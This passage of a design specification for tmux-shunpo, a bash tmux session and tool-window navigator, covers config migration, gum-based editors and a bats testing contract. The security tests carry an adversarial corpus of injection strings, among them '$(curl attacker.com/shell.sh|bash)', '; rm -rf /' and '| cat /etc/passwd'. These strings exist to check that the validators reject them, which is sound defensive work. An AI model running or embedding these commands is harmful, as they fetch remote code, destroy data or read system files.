bind-key "o" run-shell "tmux-shunpo --goto @3"       # tool 3
bind-key "p" run-shell "tmux-shunpo --goto @4"       # tool 4
bind-key "E" run-shell "tmux-shunpo --tools"         # tool editor
```

---

## 13. Migration from v0.0.x

Existing users have:
- `~/.config/tmux-shunpo/config.conf` (old custom format)
- `~/.local/share/tmux-shunpo/marks` (old format: `SLOT: /path/to/dir`)
- `~/.local/share/tmux-shunpo/tools/<session>` (unchanged format)

### 13a. Config migration

Old format (`config.conf`):
```
[directories]
~/Code
~/projects

[tool-templates]
editor:::nvim .
monitor:::htop
```

New format (`config.toml`):
```toml
tool_window_base = 88
shell_init_delay = 0.2

[ui]
popup_width = "80%"
popup_height = "70%"
```

**Strategy**: `[directories]` is gone (sesh handles discovery). `[tool-templates]`
is gone (sesh `[[window]]` entries replace it). Only UI settings carry over.

**Implementation**:
- On startup, if `config.conf` exists and `config.toml` does not, print a
  one-time warning: `"config.conf is deprecated. Create config.toml (see --help)"`
- Do NOT auto-migrate — the formats are too different
- Old `config.conf` is ignored entirely (not read)

### 13b. Marks migration

Old marks stored **paths**:
```
1: ~/Code/aggen
2: ~/Code/dotfiles
```

New marks store **sesh session names**:
```
1: aggen
2: dotfiles
```

**Strategy**: Backward-compatible — `sesh connect` accepts both paths and
session names. Old marks files with paths will continue to work because
`sesh connect ~/Code/aggen` creates/attaches a session at that path.

**No migration needed.** Old marks files work as-is. When users edit marks
via the new gum editor (which offers `sesh list` picker), they'll naturally
get session names instead of paths. Organic migration over time.

### 13c. Tools migration

Tools file format is unchanged (`SLOT: COMMAND`). The only new feature is
`@template` references resolving from sesh.toml instead of shunpo config.
Old inline commands (`1: nvim .`) still work. No migration needed.

### 13d. Migration test checklist

```bash
# Old marks file with paths should still work
echo '1: ~/Code/aggen' > ~/.local/share/tmux-shunpo/marks
tmux-shunpo --goto 1  # should sesh connect ~/Code/aggen

# Old tools file with inline commands should still work
echo '1: nvim .' > ~/.local/share/tmux-shunpo/tools/test-session
tmux-shunpo --goto @1  # should open nvim in tool window

# Deprecated config.conf should show warning
touch ~/.config/tmux-shunpo/config.conf
tmux-shunpo --help  # should warn about config.conf deprecation
```

---

## 14. Debug Support

Enable trace output with `DEBUG` environment variable:

```bash
DEBUG=1 tmux-shunpo --goto 1
```

**Implementation** (at top of script, after `set -euo pipefail`):

```bash
if [[ "${DEBUG:-}" == "1" ]]; then
    export PS4='+[${BASH_SOURCE[0]##*/}:${LINENO}${FUNCNAME[0]:+:${FUNCNAME[0]}()}] '
    set -x
fi
```

This shows file, line number, and function name for every executed command.
Useful for diagnosing keybinding issues (redirect stderr to file):

```bash
# Debug from keybinding
bind-key "d" run-shell "DEBUG=1 tmux-shunpo --goto 1 2>/tmp/shunpo-debug.log"
```

---

## 15. Broader Context (FYI only — don't implement)

tmux-shunpo is part of a larger tool ecosystem:

- **sesh** — session management (tmux-shunpo delegates to it)
- **aggen** (~/Code/aggen) — AI agent session manager (git worktree + tmux window + agent process)
- **tmux** — underlying multiplexer

The navigation layers:
```
Layer 1: Sessions  → sesh + shunpo marks (project switching)
Layer 2: Tools     → shunpo @1-@9 (per-session windows)
Layer 3: Agents    → aggen (AI agent windows with worktrees)
```

tmux-shunpo owns Layer 1 marks and Layer 2. It doesn't need to know about aggen.
Users can bind aggen's `@agent` template in tool slots for integration:

```toml
[tool-templates]
agent = "pi"
```

This is user-level composition, not code-level integration.

---

## 16. gum-Based Editors (replaces nvim popups)

Both editors run inside `tmux display-popup -E` when called from keybindings.
They also work with a direct TTY. gum is a required dependency (replaces nvim
as optional dep).

### Design Principles

- **Loop-based interaction** — show state, pick action, execute, repeat until done
- **No freeform text editing** — structured input via gum widgets (safer, friendlier)
- **Visual feedback** — `gum style` for headers, `gum table` for current state
- **Escape = cancel** — gum returns non-zero on Esc/Ctrl-C, loop exits cleanly

### 16a. Marks Editor (`--marks`)

**Flow:**
```
┌─────────────────────────────────────┐
│  ⚡ Marks                           │
│                                     │
│  Slot  Session                      │
│  1     aggen                        │
│  2     dotfiles                     │
│  3     notes                        │
│  4     (empty)                      │
│  5     (empty)                      │
│  ...                                │
│                                     │
│  > Set mark                         │
│    Clear mark                       │
│    Done                             │
└─────────────────────────────────────┘

[user picks "Set mark"]
  → gum choose slot (1-9, shows current value)
  → gum input (session name or path, pre-filled with current)
    OR gum filter from sesh list for session picker
  → mark saved
  → loop back to main menu

[user picks "Clear mark"]
  → gum choose which mark to clear (only filled slots shown)
  → mark removed + rearranged
  → loop back

[user picks "Done" or Esc]
  → exit
```

**Implementation sketch:**

```bash
ui_edit_marks() {
    while true; do
        # Build display of current marks
        local display=""
        local slot
        for slot in $(seq 1 9); do
            local value
            value=$(parse_marks "$slot" 2>/dev/null) || value=""
            if [[ -n "$value" ]]; then
                display+="$(printf '%d  %s\n' "$slot" "$value")"
            else
                display+="$(printf '%d  %s\n' "$slot" "(empty)")"
            fi
        done

        # Show current state
        gum style --border rounded --padding "0 1" \
            --border-foreground 212 --bold "⚡ Marks"
        printf '%s\n' "$display"
        printf '\n'

        # Action menu
        local action
        action=$(gum choose "Set mark" "Clear mark" "Done") || break

        case "$action" in
            "Set mark")
                # Pick slot
                local slot_choice
                slot_choice=$(gum choose --header "Select slot" \
                    $(seq 1 9)) || continue

                # Pick session: offer sesh list or manual input
                local method
                method=$(gum choose --header "Source" \
                    "Pick from sesh sessions" \
                    "Enter manually") || continue

                local new_value=""
                case "$method" in
                    "Pick from sesh sessions")
                        new_value=$(sesh list -t -c -z | gum filter \
                            --header "Select session" \
                            --placeholder "Filter...") || continue
                        ;;
                    "Enter manually")
                        local current
                        current=$(parse_marks "$slot_choice" 2>/dev/null) || current=""
                        new_value=$(gum input \
                            --header "Session name or path for slot $slot_choice" \
                            --placeholder "session-name or ~/path" \
                            --value "$current") || continue
                        ;;
                esac

                [[ -z "$new_value" ]] && continue
                mark_set "$slot_choice" "$new_value"  # new helper function
                ;;
            "Clear mark")
                # Show only filled marks
                local filled=""
                for slot in $(seq 1 9); do
                    local val
                    val=$(parse_marks "$slot" 2>/dev/null) || continue
                    filled+="$(printf '%d: %s\n' "$slot" "$val")"
                done
                if [[ -z "$filled" ]]; then
                    gum style --foreground 208 "No marks to clear"
                    sleep 1
                    continue
                fi
                local to_clear
                to_clear=$(printf '%s' "$filled" | gum choose \
                    --header "Select mark to clear") || continue
                local clear_slot="${to_clear%%:*}"
                mark_remove "$clear_slot"
                ;;
            "Done")
                break
                ;;
        esac
    done
}
```

### 16b. Tools Editor (`--tools`)

**Flow:**
```
┌──────────────────────────────────────┐
│  ⚡ Tools — session: aggen           │
│                                      │
│  Slot  Command                       │
│  @1    @editor (→ nvim .)            │
│  @2    @devserver (→ cargo watch..)  │
│  @3    cargo test                    │
│  @4    (empty)                       │
│  ...                                 │
│                                      │
│  > Set tool                          │
│    Clear tool                        │
│    Done                              │
└──────────────────────────────────────┘

[user picks "Set tool"]
  → gum choose slot (@1-@9, shows current)
  → gum choose source:
    - "Pick from sesh window templates" (reads sesh.toml [[window]])
    - "Enter command manually"
  → if template: select from sesh [[window]] names → stores @name
  → if manual: gum input for command → validate_command → stores raw cmd
  → loop back

[user picks "Clear tool"]
  → choose filled slot → remove
  → loop back
```

**Implementation sketch:**

```bash
ui_edit_tools() {
    local session_name
    session_name=$(tmux display-message -p '#S' 2>/dev/null) || {
        notify "Not in a tmux session" "error"
        return 1
    }

    # Load sesh window templates for display
    local -A templates
    while IFS= read -r line; do
        if [[ "$line" =~ ^([^:]+):::(.+)$ ]]; then
            templates["${BASH_REMATCH[1]}"]="${BASH_REMATCH[2]}"
        fi
    done < <(config_load_tool_templates)

    while true; do
        # Build display
        gum style --border rounded --padding "0 1" \
            --border-foreground 212 --bold "⚡ Tools — $session_name"

        local slot
        for slot in $(seq 1 9); do
            local tool_data
            if tool_data=$(get_tool "$session_name" "$slot" 2>/dev/null); then
                local cmd="${tool_data#*:::}"
                # If it's a @template, show expanded value
                if [[ "$cmd" =~ ^@([a-zA-Z0-9_-]+)$ ]]; then
                    local expanded="${templates[${BASH_REMATCH[1]}]:-?}"
                    printf '  @%d  %s (→ %s)\n' "$slot" "$cmd" "$expanded"
                else
                    printf '  @%d  %s\n' "$slot" "$cmd"
                fi
            else
                printf '  @%d  %s\n' "$slot" "(empty)"
            fi
        done
        printf '\n'

        local action
        action=$(gum choose "Set tool" "Clear tool" "Done") || break

        case "$action" in
            "Set tool")
                local slot_choice
                slot_choice=$(gum choose --header "Select slot" \
                    $(seq 1 9)) || continue

                local method
                method=$(gum choose --header "Source" \
                    "Pick from sesh window templates" \
                    "Enter command manually" \
                    "Shell (default shell)") || continue

                local new_cmd=""
                case "$method" in
                    "Pick from sesh window templates")
                        if [[ ${#templates[@]} -eq 0 ]]; then
                            gum style --foreground 208 \
                                "No [[window]] entries in sesh.toml"
                            sleep 1
                            continue
                        fi
                        local template_names
                        template_names=$(printf '%s\n' "${!templates[@]}")
                        local picked
                        picked=$(printf '%s' "$template_names" | gum filter \
                            --header "Select template") || continue
                        new_cmd="@${picked}"
                        ;;
                    "Enter command manually")
                        local current_cmd=""
                        # Pre-fill with existing command if any
                        if tool_data=$(get_tool "$session_name" "$slot_choice" 2>/dev/null); then
                            current_cmd="${tool_data#*:::}"
                        fi
                        new_cmd=$(gum input \
                            --header "Command for slot @$slot_choice" \
                            --placeholder "e.g. nvim . or cargo watch -x run" \
                            --value "$current_cmd") || continue
                        # Validate command (skip if @template)
                        if [[ ! "$new_cmd" =~ ^@ ]]; then
                            if ! validate_command "$new_cmd" 2>/dev/null; then
                                gum style --foreground 196 \
                                    "Invalid command: contains unsafe characters"
                                sleep 1
                                continue
                            fi
                        fi
                        ;;
                    "Shell (default shell)")
                        new_cmd="@shell"
                        ;;
                esac

                [[ -z "$new_cmd" ]] && continue
                tool_set "$session_name" "$slot_choice" "$new_cmd"  # new helper
                ;;
            "Clear tool")
                # Show only filled tool slots
                local filled=""
                for slot in $(seq 1 9); do
                    if tool_data=$(get_tool "$session_name" "$slot" 2>/dev/null); then
                        filled+="$(printf '@%d: %s\n' "$slot" "${tool_data#*:::}")"
                    fi
                done
                if [[ -z "$filled" ]]; then
                    gum style --foreground 208 "No tools to clear"
                    sleep 1
                    continue
                fi
                local to_clear
                to_clear=$(printf '%s' "$filled" | gum choose \
                    --header "Select tool to clear") || continue
                local clear_slot="${to_clear#@}"
                clear_slot="${clear_slot%%:*}"
                tool_remove "$session_name" "$clear_slot"  # new helper
                ;;
            "Done")
                break
                ;;
        esac
    done
}
```

### 16c. New helper functions needed

```bash
# Set a mark slot directly (used by gum editor)
# Args: $1=slot, $2=session_name_or_path
mark_set() { ... }

# Set a tool slot for a session
# Args: $1=session_name, $2=slot, $3=command
tool_set() { ... }

# Remove a tool slot for a session
# Args: $1=session_name, $2=slot
tool_remove() { ... }
```

These are atomic write operations — read current file, update slot, write back.

### 16d. Running editors in tmux popup

When called from keybindings (no TTY), editors must run inside a popup:

```bash
# In main(), for --marks and --tools:
if [[ ! -t 0 && -n "${TMUX:-}" ]]; then
    tmux display-popup -E -w "$CFG_POPUP_WIDTH" -h "$CFG_POPUP_HEIGHT" \
        "$0 --marks"   # re-invoke self in popup (now has TTY)
    exit 0
fi
# Otherwise run directly (already has TTY)
ui_edit_marks
```

### 16e. What gets deleted (nvim popup code)

All of these are replaced by the gum editor functions above:

- `file_create_secure_temp()` — no temp files needed, gum handles interaction
- `file_hash()` — no change detection needed, edits are immediate
- `marks_to_lines()` — no text format conversion needed
- `lines_to_marks()` — no text parsing needed
- `ui_edit_marks()` old implementation — entire nvim popup flow
- `ui_edit_tools()` old implementation — entire nvim popup flow
- All nvim-related code and dependency checks

---

## 17. Testing Contract

Every function MUST have corresponding tests. Tests use **bats-core** with
`bats-assert`, `bats-support`, and `bats-file` helpers. All external tools
(`tmux`, `sesh`, `yq`, `gum`, `fzf`) MUST be mocked in unit tests — unit
tests must never call real external tools.

### 17a. ShellCheck Compliance

All bash code MUST pass ShellCheck with zero warnings:

```bash
shellcheck -x -o all -s bash tmux-shunpo
```

Per-line disables allowed ONLY with a comment explaining why. Run shellcheck
as part of every test cycle. Treat any warning as a blocking failure.

### 17b. Test Infrastructure Setup

```
tests/
  test_helper/
    bats-support/          # git submodule
    bats-assert/           # git submodule
    bats-file/             # git submodule
    common-setup.bash      # shared setup
  fixtures/
    adversarial_inputs.txt # corpus of injection payloads
    valid_config.toml      # known-good shunpo config
    sesh_config.toml       # mock sesh.toml with [[window]] entries
  test_config.bats
  test_marks.bats
  test_tools.bats
  test_navigation.bats
  test_search.bats
  test_validate.bats
  test_security.bats
  test_cli.bats
```

**common-setup.bash:**

```bash
_common_setup() {
    load 'test_helper/bats-support/load'
    load 'test_helper/bats-assert/load'
    load 'test_helper/bats-file/load'

    PROJECT_ROOT="$(cd "$(dirname "${BATS_TEST_FILENAME}")/..' && pwd)"

    # Isolate from real tmux/sesh environment
    unset TMUX TMUX_PANE
}
```

**Git submodules for helpers:**

```bash
git submodule add https://github.com/bats-core/bats-support tests/test_helper/bats-support
git submodule add https://github.com/bats-core/bats-assert tests/test_helper/bats-assert
git submodule add https://github.com/bats-core/bats-file   tests/test_helper/bats-file
```

### 17c. Standard Test Pattern

Every test file follows this structure:

```bash
#!/usr/bin/env bats

setup() {
    load 'test_helper/common-setup'
    _common_setup
    TEST_TEMP_DIR="$(mktemp -d)"
    MOCK_BIN="${TEST_TEMP_DIR}/bin"
    mkdir -p "${MOCK_BIN}"
    export PATH="${MOCK_BIN}:${PATH}"

    # Override data/config dirs to temp
    export DATA_DIR="${TEST_TEMP_DIR}/data"
    export CONFIG_DIR="${TEST_TEMP_DIR}/config"
    export CONFIG_FILE="${CONFIG_DIR}/config.toml"
    export MARKS_FILE="${DATA_DIR}/marks"
    mkdir -p "${DATA_DIR}" "${CONFIG_DIR}" "${DATA_DIR}/tools"
}

teardown() {
    rm -rf "${TEST_TEMP_DIR}"
}
```

### 17d. Mocking External Commands

Every external tool MUST be mocked. Mock via PATH override with scripts in
`$MOCK_BIN`. Mock scripts SHOULD log invocations so tests can assert correct
calls were made.

**tmux mock:**

```bash
_mock_tmux() {
    cat > "${MOCK_BIN}/tmux" <<MOCK
#!/usr/bin/env bash
echo "tmux \$*" >> "${TEST_TEMP_DIR}/tmux_calls.log"
case "\$1" in
    display-message)
        # Return mock session name
        echo "my-project"
        ;;
    list-windows)
        printf '@1\tshell\n@2\t⚡editor\n'
        ;;
    new-window)
        echo "@42"
        ;;
    select-window|kill-window|rename-window|send-keys|display-popup|popup)
        exit 0
        ;;
    *)
        echo "mock tmux: \$*" >&2
        exit 1
        ;;
esac
MOCK
    chmod +x "${MOCK_BIN}/tmux"
}
```

**sesh mock:**

```bash
_mock_sesh() {
    cat > "${MOCK_BIN}/sesh" <<MOCK
#!/usr/bin/env bash
echo "sesh \$*" >> "${TEST_TEMP_DIR}/sesh_calls.log"
case "\$1" in
    connect)
        exit 0
        ;;
    list)
        printf 'my-project\ndotfiles\nnotes\n'
        ;;
    last)
        exit 0
        ;;
    *)
        echo "mock sesh: \$*" >&2
        exit 1
        ;;
esac
MOCK
    chmod +x "${MOCK_BIN}/sesh"
}
```

**yq mock (for config tests):**

```bash
_mock_yq() {
    cat > "${MOCK_BIN}/yq" <<MOCK
#!/usr/bin/env bash
echo "yq \$*" >> "${TEST_TEMP_DIR}/yq_calls.log"
# Default: return the default-value portion of '// default' expressions
echo "88"
MOCK
    chmod +x "${MOCK_BIN}/yq"
}
```

**gum mock (for editor tests):**

```bash
_mock_gum() {
    cat > "${MOCK_BIN}/gum" <<MOCK
#!/usr/bin/env bash
echo "gum \$*" >> "${TEST_TEMP_DIR}/gum_calls.log"
case "\$1" in
    choose)
        # Return first option by default
        echo "Done"
        ;;
    input)
        echo "mock-input"
        ;;
    filter)
        echo "mock-filtered"
        ;;
    style)
        # Pass through
        shift; echo "\$*"
        ;;
    *)
        exit 0
        ;;
esac
MOCK
    chmod +x "${MOCK_BIN}/gum"
}
```

### 17e. Required Test Files and Coverage

#### `test_config.bats` — cfg_load, sesh config reading

| Test | What it verifies |
|---|---|
| cfg_load with no config file sets defaults | All CFG_ vars get default values |
| cfg_load reads valid config.toml | yq called, values applied |
| cfg_load with missing keys uses defaults | Partial config works |
| config_load_tool_templates reads sesh.toml [[window]] | Parses name + startup_script |
| config_load_tool_templates with no sesh.toml returns empty | Graceful fallback |
| sesh_resolve_window_template resolves known template | yq query returns startup_script |
| sesh_resolve_window_template returns 1 for unknown template | Not found |

#### `test_marks.bats` — parse_marks, mark_set, mark_add, mark_remove, mark_rearrange

| Test | What it verifies |
|---|---|
| parse_marks returns slot:value pairs | Correct parsing |
| parse_marks with specific slot returns value | Single-slot lookup |
| parse_marks with empty file returns nothing | Graceful empty |
| mark_set writes slot to marks file | File updated correctly |
| mark_set overwrites existing slot | Replacement works |
| mark_add stores current session name (inside tmux) | tmux display-message called |
| mark_add stores PWD (outside tmux) | Fallback path |
| mark_add rejects duplicate | Already marked |
| mark_add finds next empty slot | Sequential allocation |
| mark_add fails when all 9 slots full | Slot overflow |
| mark_remove deletes slot and rearranges | Gap filling |
| mark_remove nonexistent slot fails | Error handling |
| mark_rearrange compacts gaps | 1,3,7 → 1,2,3 |

#### `test_tools.bats` — get_tool, tool_set, tool_remove, tool_auto_populate, navigate_to_tool, generate_window_name

| Test | What it verifies |
|---|---|
| get_tool returns name:::command for filled slot | Correct parsing |
| get_tool returns 1 for empty slot | Not found |
| get_tool returns 1 for missing tools file | Graceful missing |
| get_tool expands @template from sesh.toml | Template resolution |
| get_tool expands @shell to default shell | Special case |
| get_tool triggers auto-populate on missing tools file | Lazy init |
| tool_set writes to tools file | File updated |
| tool_set creates tools file if missing | First tool |
| tool_remove clears slot | Slot cleared |
| tool_auto_populate from [[session]] match | Matched by name, windows → @slots |
| tool_auto_populate from [[wildcard]] match | Matched by glob pattern |
| tool_auto_populate from [default_session] fallback | No session/wildcard match |
| tool_auto_populate no sesh.toml → no file created | Graceful missing config |
| tool_auto_populate no windows configured → no file | Empty windows array |
| tool_auto_populate skips when tools file exists | Never overwrites user edits |
| tool_auto_populate caps at 9 slots | >9 windows truncated |
| tool_auto_populate writes @name references not raw commands | Template refs preserved |
| navigate_to_tool creates window when missing | tmux new-window called |
| navigate_to_tool switches to existing window | tmux select-window called |
| navigate_to_tool pastes command in idle shell | tmux send-keys called |
| generate_window_name uses first word of command | Sanitized name |
| generate_window_name truncates long names | Max length enforced |
| generate_window_name uses custom name when provided | Override works |

#### `test_navigation.bats` — mark_jump_to, search_and_connect

| Test | What it verifies |
|---|---|
| mark_jump_to calls sesh connect with session name | sesh_calls.log checked |
| mark_jump_to with invalid slot returns error | Error message |
| mark_jump_to with empty mark returns error | Mark not found |
| search_and_connect invokes sesh list and fzf | Both called |
| search_and_connect with cancelled fzf shows message | Graceful cancel |

#### `test_validate.bats` — validate_command, validate_range

| Test | What it verifies |
|---|---|
| validate_command accepts simple commands | `nvim .`, `cargo test` |
| validate_command accepts paths with slashes | `/usr/bin/thing` |
| validate_command accepts env vars in command | `PORT=3000 npm start` |
| validate_command rejects semicolons | `; rm -rf /` |
| validate_command rejects pipes | `cmd \| evil` |
| validate_command rejects command substitution | `$(whoami)` |
| validate_command rejects backticks | `` `id` `` |
| validate_command rejects ampersands | `&& curl evil` |
| validate_command rejects directory traversal | `../../etc/passwd` |
| validate_command rejects empty command | Empty string |
| validate_range accepts in-range value | Normal case |
| validate_range rejects below minimum | Out of range |
| validate_range rejects non-numeric | Letters |

#### `test_security.bats` — Dedicated adversarial input suite

This file tests ALL functions that handle user input with the full adversarial
corpus. Every input from `fixtures/adversarial_inputs.txt` must be tested.

**Adversarial corpus** (`tests/fixtures/adversarial_inputs.txt`):

```
$(whoami)
`id`
; rm -rf /
| cat /etc/passwd
&& curl evil.com
${IFS}cat${IFS}/etc/passwd
../../etc/passwd
-rf /
foo   bar
*
?
[abc]
$(curl attacker.com/shell.sh|bash)
foo;touch /tmp/pwned
```

**Functions that MUST have adversarial tests:**

| Function | Attack vectors | SEC ref |
|---|---|---|
| `validate_command` | Shell metacharacters, pipes, command substitution, redirects | SEC-01 |
| `validate_session_name` | Path traversal (`../..`), leading dash, metacharacters | SEC-03, SEC-07 |
| `validate_template_name` | Shell metacharacters in yq query injection | SEC-09 |
| `mark_set` (session name input) | Injection via crafted session names | SEC-03 |
| `mark_jump_to` (slot input) | Non-numeric input, negative numbers | SEC-04 |
| `tool_set` (command input) | Full adversarial corpus | SEC-01 |
| `get_tool` (session name) | Path traversal in session name (`../../etc/passwd`) | SEC-07 |
| `generate_window_name` | Metacharacters in command string | SEC-01 |
| `cfg_load` | Malformed TOML, injection via config values | SEC-06 |
| `cfg_check_file_safety` | World-writable config, wrong owner | SEC-05 |
| `tool_auto_populate` | Malicious window names in sesh.toml | SEC-09 |

**Canary pattern** — verify shell injection does NOT execute:

```bash
@test "validate_command does not execute embedded commands" {
    local canary="${TEST_TEMP_DIR}/pwned"

    run validate_command "; touch ${canary}"
    assert_failure
    assert_file_not_exist "${canary}"

    run validate_command "\$(touch ${canary})"
    assert_failure
    assert_file_not_exist "${canary}"

    run validate_command "\`touch ${canary}\`"
    assert_failure
    assert_file_not_exist "${canary}"
}

@test "mark_set does not execute injected session names" {
    local canary="${TEST_TEMP_DIR}/pwned"

    # mark_set should either reject or safely store the literal string
    mark_set 1 "; touch ${canary}" 2>/dev/null || true
    assert_file_not_exist "${canary}"

    mark_set 1 "\$(touch ${canary})" 2>/dev/null || true
    assert_file_not_exist "${canary}"
}

@test "get_tool rejects path traversal in session name" {
    run get_tool "../../etc/passwd" 1
    assert_failure
}
```

**Loop-based adversarial test:**

**Loop-based adversarial tests** (one per function that handles user input):

```bash
@test "validate_command rejects all adversarial inputs" {
    while IFS= read -r payload; do
        [[ -z "$payload" || "$payload" == \#* ]] && continue
        run validate_command "$payload"
        assert_failure
    done < "${PROJECT_ROOT}/tests/fixtures/adversarial_inputs.txt"
}

@test "validate_session_name rejects all adversarial inputs" {
    while IFS= read -r payload; do
        [[ -z "$payload" || "$payload" == \#* ]] && continue
        run validate_session_name "$payload"
        assert_failure
    done < "${PROJECT_ROOT}/tests/fixtures/adversarial_inputs.txt"
}

@test "validate_template_name rejects all adversarial inputs" {
    while IFS= read -r payload; do
        [[ -z "$payload" || "$payload" == \#* ]] && continue
        run validate_template_name "$payload"
        assert_failure
    done < "${PROJECT_ROOT}/tests/fixtures/adversarial_inputs.txt"
}
```

**Config file security tests:**

```bash
@test "cfg_check_file_safety rejects world-writable config" {
    local bad_config="${TEST_TEMP_DIR}/world-writable.toml"
    echo 'tool_window_base = 88' > "$bad_config"
    chmod 666 "$bad_config"
    run cfg_check_file_safety "$bad_config"
    assert_failure
    assert_output --partial "world-writable"
}

@test "cfg_check_file_safety accepts normal permissions" {
    local good_config="${TEST_TEMP_DIR}/normal.toml"
    echo 'tool_window_base = 88' > "$good_config"
    chmod 644 "$good_config"
    run cfg_check_file_safety "$good_config"
    assert_success
}

@test "cfg_check_file_safety accepts missing file" {
    run cfg_check_file_safety "${TEST_TEMP_DIR}/nonexistent.toml"
    assert_success
}
```

**Atomic write tests:**

```bash
@test "mark_set uses atomic write (temp + mv)" {
    # After mark_set, no .tmp files should remain
    mark_set 1 "test-session"
    local tmp_files
    tmp_files=$(find "${DATA_DIR}" -name '*.tmp.*' 2>/dev/null | wc -l)
    [[ "$tmp_files" -eq 0 ]]
}

@test "tool_set uses atomic write" {
    tool_set "test-session" 1 "nvim ."
    local tmp_files
    tmp_files=$(find "${DATA_DIR}" -name '*.tmp.*' 2>/dev/null | wc -l)
    [[ "$tmp_files" -eq 0 ]]
}
```

#### `test_cli.bats` — main() argument parsing, --help, --version

| Test | What it verifies |
|---|---|
| --help prints usage | Output contains key commands |
| --version prints version | Matches pattern |
| --goto without argument shows error | Error message |
| --goto @N routes to navigate_to_tool | Correct dispatch |
| --goto N routes to mark_jump_to | Correct dispatch |
| unknown flag shows error | Error message |
| no arguments shows usage | Help displayed |

### 17f. Running Tests

```bash
# All tests
bats tests/

# Single file
bats tests/test_marks.bats

# Single test by name
bats tests/test_validate.bats --filter "rejects semicolon"

# ShellCheck (run separately, must pass clean)
shellcheck -x -o all -s bash tmux-shunpo
```

### 17g. Test Fixtures

**`tests/fixtures/valid_config.toml`:**

```toml
tool_window_base = 88
shell_init_delay = 0.2
window_name_max_length = 20

[ui]
popup_width = "80%"
popup_height = "70%"
```

**`tests/fixtures/sesh_config.toml`:**

Comprehensive sesh.toml fixture that covers all resolution tiers: explicit
session, wildcard, default, and window definitions.

```toml
[default_session]
startup_command = "nvim"
windows = ["editor", "shell"]

[[session]]
name = "test-project"
path = "~/Code/test"
startup_command = "nvim"
windows = ["editor", "tests", "agent"]

[[session]]
name = "no-windows-project"
path = "~/Code/no-windows"
startup_command = "nvim"
# no windows array — should fall through to wildcard/default

[[wildcard]]
pattern = "~/Code/*"
windows = ["editor", "devserver", "shell"]

[[wildcard]]
pattern = "~/Notes/*"
windows = ["editor"]

[[window]]
name = "editor"
startup_script = "nvim ."

[[window]]
name = "tests"
startup_script = "bats tests/"

[[window]]
name = "devserver"
startup_script = "cargo watch -x run"

[[window]]
name = "agent"
startup_script = "pi"

[[window]]
name = "shell"
# no startup_script — plain shell
```

**`tests/fixtures/adversarial_inputs.txt`:**

```
$(whoami)
`id`
; rm -rf /
| cat /etc/passwd
&& curl evil.com
${IFS}cat${IFS}/etc/passwd
../../etc/passwd
-rf /
foo   bar
*
?
[abc]
$(curl attacker.com/shell.sh|bash)
foo;touch /tmp/pwned
```

### 17h. Code Review Checklist

Before any work item is considered complete:

- [ ] All functions have unit tests in `tests/`
- [ ] Tests use `mktemp` for temp dirs and `teardown()` for cleanup
- [ ] External commands (`tmux`, `sesh`, `yq`, `gum`, `fzf`) are mocked via PATH override
- [ ] Mock scripts log invocations to `*_calls.log` files
- [ ] Functions handling user input have adversarial input tests with canary pattern
- [ ] All variables are double-quoted
- [ ] All function-local variables use `local`
- [ ] Constants use `readonly`
- [ ] No `eval`, `bash -c "$var"`, or `source` on external files
- [ ] `--` used before user-supplied arguments to commands
- [ ] Errors go to stderr, data to stdout
- [ ] `shellcheck -x -o all -s bash tmux-shunpo` passes with **zero warnings**
- [ ] Temp files use `mktemp` and are cleaned up via `trap EXIT`
